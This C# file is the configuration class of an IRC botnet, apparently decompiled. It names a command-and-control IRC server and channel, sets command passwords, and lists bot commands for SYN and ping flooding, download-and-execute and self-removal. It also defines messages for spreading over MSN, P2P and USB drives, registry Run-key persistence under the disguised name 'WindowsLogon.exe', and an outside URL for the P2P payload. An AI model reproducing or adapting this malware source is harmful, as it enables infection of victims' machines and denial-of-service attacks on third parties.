using System;
using Microsoft.Win32;

namespace explorer;

internal static class config
{
	public static bool debug = true;

	public static bool truedebug = false;

	public static string version = "1.1.0";

	public static string name = "Author";

	public static string mutex = "WindowsLogon13Z24E2";

	public static string host = "irc.rizon.net";

	public static int port = 6667;

	public static string channel = "#lolz22";

	public static string channelpass = "";

	public static string nick = "%os%-%rand%";

	public static string user = "%rand%";

	public static int randomLength = 5;

	public static string realName = "%rand%";

	public static bool isVisible = true;

	public static string cmdPassword = "zes";

	public static string cmdPrefix = "*.*";

	public static string[] commands = new string[13]
	{
		"ssyn.stop", "ssyn", "auth", "logout", "dl", "visit", "rm", "about", "ver", "say",
		"exit", "ping", "ping.stop"
	};

	public static commandlist cmdList = new basecommandlist();

	public static string cmd_remove_pass = "bes";

	public static string teller_prefix = "\u00030,1 {";

	public static string teller_suffix = "}";

	public static string teller_error = "\u00034 [Error]: %msg% ";

	public static string teller_info = "\u00039 [Succes]: %msg% ";

	public static string teller_warning = "\u00037 [Warning]: %msg% ";

	public static int about_backcolor = 1;

	public static int about_forecolor = 4;

	public static int about_fontcolor = 9;

	public static string about_name = "%name% v%version%";

	public static string about_madeby = "Made by %emiel% & %dion%";

	public static string about_emiel = "\u0002\u001f\u00030," + about_backcolor + "E\u000315," + about_backcolor + "mi\u000314," + about_backcolor + "el\u001f\u0002\u0003" + about_fontcolor + "," + about_backcolor;

	public static string about_dion = "\u0002\u001f\u00030," + about_backcolor + "D\u000315," + about_backcolor + "io\u000314," + about_backcolor + "n\u001f\u0002\u0003" + about_fontcolor + "," + about_backcolor;

	public static bool about_ismod = true;

	public static string about_modby = "Licensed under:";

	public static string about_ismodby = "Emiel & Dion";

	public static string about_top_close = "-----------------------------------------";

	public static string about_bot_close = about_top_close;

	public static string about_side_char = "+";

	public static string about_back_char = " ";

	public static string version_message = "\u00034,1 + \u001f\u00039,1%name%\u001f v\u0002%version%\u00034,1 + ";

	public static string language_usystem_error_logout = "You're not logged in.";

	public static string language_usystem_error_login = "Already Logged in %user%";

	public static string language_usystem_success_logout = "Logged Out %user%";

	public static string language_usystem_success_login = "Authentication Accepted.";

	public static string langauge_usystem_noinput_login = "Password Needed %user%";

	public static string language_usystem_password_error = "Authentication Wrong.";

	public static string language_download_error_noparms = "Wrong Code %user%";

	public static string language_download_success_norun = "Downloaded: %url%";

	public static string language_download_success_run = "Downloaded: %url% to: %loc% and executed file";

	public static string language_exec_error_noparms = "Wrong Command Prompt Code";

	public static string language_remove_password_error = "Remove Password Wrong";

	public static string language_remove_success = "Removed by: %user%";

	public static string language_remove_noparms = "Remove Password Wrong";

	public static string language_remove_quit = "Removed by %user% ";

	public static string language_spreading_msn_noparms = "Message Needed";

	public static string language_spreading_msn_nomsn = "No MSN Availible trying to start msn...";

	public static string language_spreading_msn_started_success = "MSN Spreading from %email%";

	public static string language_spreading_msn_started_error = "Msn Error for %email%";

	public static string language_spreading_msn_stopped_success = "Msn Spread Stopped";

	public static string language_spreading_msn_stopped_allready = "Msn Spread Already Running";

	public static string language_spreading_msn_started_allready = "Msn Thread Already Running";

	public static string language_spreading_msn_send_msg_success = "Messaged %email%";

	public static string language_spreading_msn_send_msg_error = "Error from %email%";

	public static string language_usb_success = "Infected drive: %drive%";

	public static string language_usb_failed = "%drive% Is Secured";

	public static string language_usb_allready = "Drive allready infected: %drive%";

	public static string language_ssyn_stopped = "SSYN Flooding stopped on IP: %ip%:%port%";

	public static string language_ssyn_success = "SSYN Flooding on IP: %ip%:%port% with %sockets% sockets and %threads% threads!";

	public static string language_ssyn_allready = "SSYN Flooding already on IP: %ip%:%port% with %sockets% sockets and %threads% threads!";

	public static string language_ssyn_notrunning = "SSYN Flooding not running!";

	public static string language_ssyn_noparms = "Wrong usage!";

	public static string language_spreading_p2p_success = "P2P spreaded!";

	public static string language_spreading_p2p_error = "P2P ERROR!";

	public static string language_ping_success = "PING Flooding on IP: %ip% With: %threads% Thread(s)";

	public static string language_ping_already = "PING Flooding Already on IP: %ip%";

	public static string language_ping_notrunning = "PING Flood Is not Running";

	public static string language_ping_error = "PING Wrong Usage, <host> <threads>";

	public static string language_ping_stopped = "PING Flooding stopped on IP: %ip%";

	public static RegistryKey infecting_startup_regkey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);

	public static string infecting_startup_pathexe = Environment.GetEnvironmentVariable("appdata") + "\\WindowsLogon.exe";

	public static string infecting_startup_exename = "WindowsLogon.exe";

	public static string infecting_startup_name = "Windows Logon";

	public static string spreading_msn_store = misc.pathfromexe(infecting_startup_pathexe) + "\\Interop.MessengerAPI.dll";

	public static int spreading_msn_interval_offline = 1000;

	public static int spreading_msn_interval_online = 7000;

	public static bool spreading_msn_send_inchars = false;

	public static string spreading_p2p_url = "http://dje-style.com/panel.txt";
}
